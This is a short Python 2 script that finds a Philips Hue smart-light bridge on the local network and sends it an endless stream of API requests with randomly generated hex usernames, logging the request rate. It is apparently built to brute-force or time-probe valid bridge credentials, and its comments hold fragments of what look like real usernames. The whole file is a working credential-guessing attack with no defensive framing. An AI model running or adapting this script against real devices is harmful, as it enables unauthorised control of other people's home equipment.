from pprint import pprint
import string
import random
import time

import requests
import discover

s = requests.Session()
s.headers = {}  # make our packet smaller. The server ignores headers
hue_url = discover.find_hue()
#username = 1c25a48511e41087b579651102bf5b3
#2db27de422b0774fedf9a0c2bdfc0d7
count = 0
start_time = time.time()
interval = start_time
while True:
#    username = random.choice([
#        random.choice(string.hexdigits[:16]),  # ignore uppercase
#        '1c25a48511e41087b579651102bf5bX',
#    ])
    username = ''.join([random.choice(string.hexdigits[:16])
                        for x in
                        range(random.choice([1, 16, 30, 31, 32, 40, 50]))])
    res = s.get(hue_url + 'api/{}/config'.format(username))
    #pprint(res.json())
    count += 1
    if count % 100 == 0:
        now = time.time()
        elapsed = now - start_time
        print count, elapsed, 100 / (now - interval)
        interval = now
